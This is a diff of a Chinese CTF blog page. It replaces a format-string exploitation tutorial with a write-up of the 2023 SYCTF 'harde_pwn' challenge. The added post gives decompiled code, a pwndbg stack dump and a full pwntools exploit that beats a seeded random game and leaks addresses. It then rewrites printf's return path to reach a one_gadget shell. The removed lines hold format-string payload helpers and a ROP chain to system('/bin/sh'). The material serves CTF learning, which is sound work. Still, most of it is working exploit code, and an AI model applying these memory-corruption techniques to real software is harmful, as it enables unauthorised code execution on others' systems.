@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="《格式化字符串》, StarrySky">
+    <meta name="keywords" content="2023_syctf_harde_pwn复现, StarrySky">
     <meta name="description" content="Love rises from the east and descends to the west,romance makes no changes until death.">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>《格式化字符串》 | StarrySky</title>
+    <title>2023_syctf_harde_pwn复现 | StarrySky</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -289,12 +289,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">《格式化字符串》</h1>
+                    <h1 class="description center-align post-title">2023_syctf_harde_pwn复现</h1>
                 </div>
             </div>
         </div>
@@ -410,12 +410,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/pwn/">
-                                <span class="chip bg-color">pwn</span>
-                            </a>
-                        
-                            <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
-                                <span class="chip bg-color">格式化字符串</span>
+                            <a href="/tags/%E9%9D%9E%E6%A0%88%E4%B8%8A%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
+                                <span class="chip bg-color">非栈上的格式化字符串</span>
                             </a>
                         
                     </div>
@@ -439,21 +435,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-06-20
+                    2023-08-06
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-06-20
+                    2023-08-06
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    917
+                    786
                 </div>
                 
 
@@ -478,116 +474,156 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><h2 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h2><pre class="line-numbers language-none"><code class="language-none">%[parameter][flags][field width][.precision][length]type<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+                <p>首先需要通过一个<code>game</code>，通过溢出改<code>seed = 0</code>，然后联合<code>C</code>编程计算随机数</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">_DWORD *fuxk_game()
+&#123;
+  _DWORD *result; &#x2F;&#x2F; rax
+  char buf[28]; &#x2F;&#x2F; [rsp+0h] [rbp-40h] BYREF
+  __int64 seed; &#x2F;&#x2F; [rsp+1Ch] [rbp-24h]
+  int v3; &#x2F;&#x2F; [rsp+24h] [rbp-1Ch] BYREF
+  int v4; &#x2F;&#x2F; [rsp+28h] [rbp-18h]
+  int i; &#x2F;&#x2F; [rsp+2Ch] [rbp-14h]
 
-<ul>
-<li>使用以<code>%</code>开头的格式说明符占位，在后面参数列表中提供相应变量</li>
-<li><code>c</code>，把 int 参数转为 unsigned char 型输出</li>
-<li><code>p</code>， void * 型，printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址</li>
-<li><code>n</code>，不输出字符，将该字符之前的字符数量写入参数中</li>
-</ul>
-<h2 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h2><p>利用格式化字符串漏洞，我们还可以获取我们所想要输出的内容。一般会有如下几种操作</p>
-<ul>
-<li>泄露栈内存<ul>
-<li>获取某个变量的值</li>
-<li>获取某个变量对应地址的内存</li>
-</ul>
-</li>
-<li>泄露任意地址内存<ul>
-<li>利用 <code>GOT</code> 表得到 <code>libc</code> 函数地址，进而获取 <code>libc</code>，进而获取其它 <code>libc</code> 函数地址</li>
-<li>盲打，<code>dump</code> 整个程序，获取有用信息。</li>
-</ul>
-</li>
-</ul>
-<h2 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h2><p>payload：<code>‘%’ + str(target_addr) + &#39;c%offset$n&#39;</code></p>
-<ul>
-<li><code>hhn</code>:1字节（2位</li>
-<li><code>hn</code>：2字节（4位</li>
-<li><code>n</code>：4字节（8位</li>
-</ul>
-<h3 id="栈上的格式化字符串"><a href="#栈上的格式化字符串" class="headerlink" title="栈上的格式化字符串"></a>栈上的格式化字符串</h3><h4 id="确定偏移offset"><a href="#确定偏移offset" class="headerlink" title="确定偏移offset"></a>确定偏移offset</h4><p>在<code>printf</code>下断点，利用<code>fmtarg</code>工具获取偏移</p>
-<h4 id="修改内存函数基本构造"><a href="#修改内存函数基本构造" class="headerlink" title="修改内存函数基本构造"></a>修改内存函数基本构造</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fmt1</span><span class="token punctuation">(</span>prev<span class="token punctuation">,</span> word<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">if</span> prev <span class="token operator">&lt;</span> word<span class="token punctuation">:</span>
-        result <span class="token operator">=</span> word <span class="token operator">-</span> prev
-        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>
-    <span class="token keyword">elif</span> prev <span class="token operator">==</span> word<span class="token punctuation">:</span>
-        result <span class="token operator">=</span> <span class="token number">0</span>
-    <span class="token keyword">else</span><span class="token punctuation">:</span>
-        result <span class="token operator">=</span> <span class="token number">256</span> <span class="token operator">+</span> word <span class="token operator">-</span> prev
-        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>
-    fmtstr <span class="token operator">+=</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"$hhn"</span>
-    <span class="token keyword">return</span> fmtstr
+  puts(&quot;Welcome to a ctype game!&quot;);
+  seed &#x3D; randomm();
+  read(0, buf, 0x20uLL);
+  srand(seed);
+  for ( i &#x3D; 0; i &lt;&#x3D; 20; ++i )
+  &#123;
+    v4 &#x3D; (rand() ^ 0x24) + 1;
+    puts(&quot;input: &quot;);
+    __isoc99_scanf(&quot;%d&quot;, &amp;v3);
+    if ( v4 !&#x3D; v3 )
+    &#123;
+      puts(&quot;fuxk up!&quot;);
+      exit(1);
+    &#125;
+    puts(&quot;Success!&quot;);
+  &#125;
+  result &#x3D; &amp;is_fmt;
+  is_fmt &#x3D; 1;
+  return result;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<p>接着进入一个无限次堆上的格式化字符串函数</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">void __noreturn heap_fmt()
+&#123;
+  char *ptr; &#x2F;&#x2F; [rsp+8h] [rbp-8h]
 
-<span class="token keyword">def</span> <span class="token function">fmt2</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> size<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    payload <span class="token operator">=</span> <span class="token string">""</span>
-    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">if</span> size <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>
-            payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>
-        <span class="token keyword">else</span><span class="token punctuation">:</span>
-            payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>
-    prev <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        payload <span class="token operator">+=</span> fmt<span class="token punctuation">(</span>prev<span class="token punctuation">,</span> <span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span> offset <span class="token operator">+</span> i<span class="token punctuation">)</span>
-        prev <span class="token operator">=</span> <span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>
-    <span class="token keyword">return</span> payload
-payload <span class="token operator">=</span> fmt_str<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x0804A028</span><span class="token punctuation">,</span><span class="token number">0x12345678</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+  for ( ptr &#x3D; 0LL; ; printf(ptr) )
+  &#123;
+    ptr &#x3D; (char *)realloc(ptr, 0x1000uLL);
+    my_write(&quot;input your data ;)\n&quot;);
+    read(0, ptr, 0x1000uLL);
+  &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>32位时自带函数：<code>fmtstr_payload(偏移，&#123;被改的got：要改的plt&#125;)</code></p>
-<h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><ul>
-<li>泄露libc等所需地址</li>
-<li>将需要修改的地址写入栈</li>
-<li>获取写入</li>
-</ul>
-<h3 id="非栈上格式化字符串漏洞"><a href="#非栈上格式化字符串漏洞" class="headerlink" title="非栈上格式化字符串漏洞"></a>非栈上格式化字符串漏洞</h3><p>技巧：1.改<code>ret</code>地址中的<code>libc_start_main</code>为<code>ogg</code></p>
-<p>​          2.改<code>printf_got</code>为<code>system/ogg</code></p>
-<p>​          3.泄露<code>stack</code>地址的时候如果<code>ebp</code>地址不对就用和<code>ebp</code>连接的地址一样的地址</p>
-<pre class="line-numbers language-none"><code class="language-none">sys1 &#x3D; system &amp; 0xff #取低字节
-sys2 &#x3D; (system&gt;&gt;8) &amp; 0xffff #取第二三字节 
-gift_addr &#x3D; gift &amp; 0xffff #取低二字节
-p4 &#x3D; &#39;%&#39; + str(sys1) + &#39;c%8$hhn&#39; + &#39;%&#39; + str((gift_addr) - (sys1)) + &#39;c%9$hn&#39; + &#39;%&#39; + str(sys2-gift_addr) + &#39;c%10$hn&#39; 
-r.sendlineafter(&#39;gift for you: \n&#39;,p4)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>因为<code>got</code>表不可写且<code>for</code>是死循环，所以需要改<code>printf</code>的返回地址最终运行到<code>ogg</code></p>
+<pre class="line-numbers language-none"><code class="language-none">► 0x7ffff7c6082f &lt;printf+191&gt;             add    rsp, 0xd8
+  0x7ffff7c60836 &lt;printf+198&gt;             ret    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p>若需分两次改则需要两条链，当第二次发送的数据小于第一次发送的数据时，要加<code>0x10000</code></p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#简单的格式化字符串利用函数，将dest地址的后8字节循环更改成ptr对应的字节，off1与off2为上述（1）与（2）两个栈地址在格式化字符串中的偏移</span>
-<span class="token keyword">def</span> <span class="token function">overlap</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span>ptr<span class="token punctuation">,</span>off1<span class="token punctuation">,</span>off2<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    d<span class="token operator">=</span>dest<span class="token operator">&amp;</span><span class="token number">0xff</span>
-    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">if</span> <span class="token keyword">not</span> ptr<span class="token punctuation">:</span>
-            <span class="token keyword">break</span>
-        payload<span class="token operator">=</span><span class="token string">b'%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'c%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>off1<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'$hhn'</span>
-        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'food: '</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
-        f<span class="token operator">=</span>ptr<span class="token operator">&amp;</span><span class="token number">0xff</span>
-        payload<span class="token operator">=</span><span class="token string">b'%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'c%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>off2<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'$hhn'</span>
-        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'food: '</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
-        d<span class="token operator">+=</span><span class="token number">1</span>
-        ptr<span class="token operator">>></span><span class="token operator">=</span><span class="token number">8</span>
+<p>返回地址是<code>rsp</code>，并且在原本的地址上加了<code>0xd8</code>，因此将<code>rsp+0xd8</code>的地方改成<code>__libc_csu_init+97</code>，因为地址位数相差过大不能直接改<code>ogg</code></p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; stack
+00:0000│ rsp 0x7fffffffdd60 ◂— 0x3000000010
+01:0008│     0x7fffffffdd68 —▸ 0x7fffffffde40 ◂— 0x0
+02:0010│     0x7fffffffdd70 —▸ 0x7fffffffdd80 ◂— 0x1
+03:0018│     0x7fffffffdd78 ◂— 0x9d5edc9b23af5200
+04:0020│     0x7fffffffdd80 ◂— 0x1
+05:0028│     0x7fffffffdd88 —▸ 0x55555555b2a0 ◂— &#39;%177c%45$hhn&#39;
+06:0030│     0x7fffffffdd90 ◂— 0x1000
+07:0038│     0x7fffffffdd98 —▸ 0x7ffff7d14992 (read+18) ◂— cmp    rax, -0x1000 &#x2F;* &#39;H&#x3D;&#39; *&#x2F;
+pwndbg&gt; 
+08:0040│  0x7fffffffdda0 —▸ 0x55555555b2a0 ◂— &#39;%177c%45$hhn&#39;
+09:0048│  0x7fffffffdda8 ◂— 0x0
+0a:0050│  0x7fffffffddb0 —▸ 0x55555555b2a0 ◂— &#39;%177c%45$hhn&#39;
+0b:0058│  0x7fffffffddb8 ◂— 0x1000
+0c:0060│  0x7fffffffddc0 —▸ 0x55555555b290 ◂— 0x0
+0d:0068│  0x7fffffffddc8 ◂— 0x1010
+0e:0070│  0x7fffffffddd0 ◂— 0x1010
+0f:0078│  0x7fffffffddd8 —▸ 0x7ffff7ca5989 (realloc+457) ◂— mov    r8, rax
+pwndbg&gt; 
+10:0080│  0x7fffffffdde0 ◂— 0x1000
+11:0088│  0x7fffffffdde8 ◂— 0xff
+12:0090│  0x7fffffffddf0 —▸ 0x555555555502 (main) ◂— endbr64 
+13:0098│  0x7fffffffddf8 ◂— 0x0
+14:00a0│  0x7fffffffde00 —▸ 0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
+15:00a8│  0x7fffffffde08 —▸ 0x555555555365 (my_write+55) ◂— nop    
+16:00b0│  0x7fffffffde10 —▸ 0x7fffffffde50 —▸ 0x7ffff7cebcf5 (execvpe+1141) ◂— mov    rsi, r10
+17:00b8│  0x7fffffffde18 —▸ 0x55555555604b ◂— &#39;input your data ;)\n&#39;
+pwndbg&gt; 
+18:00c0│     0x7fffffffde20 —▸ 0x555555555502 (main) ◂— endbr64 
+19:00c8│     0x7fffffffde28 ◂— 0x13
+1a:00d0│     0x7fffffffde30 —▸ 0x7fffffffde50 —▸ 0x7ffff7cebcf5 (execvpe+1141) ◂— mov    rsi, r10
+1b:00d8│     0x7fffffffde38 —▸ 0x5555555555b1 (__libc_csu_init+97) ◂— pop    rsi
+1c:00e0│     0x7fffffffde40 ◂— 0x0
+1d:00e8│     0x7fffffffde48 —▸ 0x55555555b2a0 ◂— &#39;%177c%45$hhn&#39;
+1e:00f0│ rbp 0x7fffffffde50 —▸ 0x7ffff7cebcf5 (execvpe+1141) ◂— mov    rsi, r10
+1f:00f8│     0x7fffffffde58 —▸ 0x555555555543 (main+65) ◂— mov    eax, 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-ret<span class="token operator">=</span>rsp<span class="token operator">+</span><span class="token number">0x18</span>
-ptr<span class="token operator">=</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x21112</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token comment">#通过将第25个参数传入格式化字符串，将第39个参数的值改为返回地址</span>
-payload<span class="token operator">=</span><span class="token string">b'%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>ret<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'c%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'$hn'</span>
-p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'food: '</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
-<span class="token comment">#覆盖返回地址为ptr（pop_rdi; ret）</span>
-overlap<span class="token punctuation">(</span>ret<span class="token punctuation">,</span>ptr<span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">)</span>
-<span class="token comment">#覆盖返回地址+8的位置为binsh字符串地址</span>
-overlap<span class="token punctuation">(</span>ret<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">)</span>
-<span class="token comment">#覆盖返回地址+16的位置为system函数的地址</span>
-overlap<span class="token punctuation">(</span>ret<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">)</span>
-<span class="token comment">#至此，退出循环执行ROP后即可获取系统操作权限</span>
-p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'food: '</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>从<code>__libc_csu_init</code>的返回地址是<code>rsp</code>，所以事先将<code>rbp</code>改成<code>ogg</code>，再利用<code>__libc_csu_init+97</code>的两次<code>ret</code>将<code>rsp</code>移到<code>rbp</code>，<code>ret</code>到<code>ogg</code></p>
+<p>exp：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>
 
-<ul>
-<li><p>泄露<code>libc</code>：<code>__libc_start_main</code></p>
-</li>
-<li><p>修改：<code>payload = (b&#39;%&#39; + bytes(str(one1), encoding=&#39;utf-8&#39;) + b&#39;c%8$hn&#39;).ljust(16, b&#39;a&#39;) + p64(exit_addr)</code>，分多次修改每次<code>sleep(0.5)</code></p>
-</li>
-<li><pre><code class="python">num = 12345
-num_bytes = num.to_bytes(2, byteorder=&#39;little&#39;)		#转换为字节序列
-</code></pre>
-</li>
-</ul>
+context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+
+file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>
+
+li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>
+ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>
+
+<span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>
+
+debug <span class="token operator">=</span> <span class="token number">0</span>
+<span class="token keyword">if</span> debug<span class="token punctuation">:</span>
+    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
+
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
+libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'./2.35/libc.so.6'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>
+
+seed <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x20</span>
+r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Welcome to a ctype game!'</span><span class="token punctuation">,</span> seed<span class="token punctuation">)</span>
+
+seed <span class="token operator">=</span> <span class="token number">0</span>
+libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>seed<span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    v6 <span class="token operator">=</span> <span class="token punctuation">(</span>libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x24</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>
+    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'input: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'input your data ;)\n'</span><span class="token punctuation">,</span> <span class="token string">b'%8$p%11$p%7$p'</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>
+stack <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>
+libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x29d90</span>
+
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>
+heap_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x2a0</span>
+
+ret <span class="token operator">=</span> stack <span class="token operator">-</span> <span class="token number">8</span>
+ptr <span class="token operator">=</span> stack <span class="token operator">-</span> <span class="token number">0x18</span>
+rbp <span class="token operator">=</span> stack <span class="token operator">-</span> <span class="token number">0x10</span>
+
+one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x50a37</span><span class="token punctuation">,</span> <span class="token number">0xebcf1</span><span class="token punctuation">,</span> <span class="token number">0xebcf5</span><span class="token punctuation">,</span> <span class="token number">0xebcf8</span><span class="token punctuation">,</span> <span class="token number">0xebd52</span><span class="token punctuation">,</span> <span class="token number">0xebdaf</span><span class="token punctuation">,</span> <span class="token number">0xebdb3</span><span class="token punctuation">]</span>
+one_gadget <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base
+printf_ret <span class="token operator">=</span> ptr <span class="token operator">-</span> <span class="token number">0x10</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'input your data ;)\n'</span><span class="token punctuation">,</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>rbp <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%15$hn\x00'</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'input your data ;)\n'</span><span class="token punctuation">,</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one_gadget <span class="token operator">>></span> i<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%45$hhn\x00'</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'input your data ;)\n'</span><span class="token punctuation">,</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>printf_ret <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%15$hn\x00'</span><span class="token punctuation">)</span>
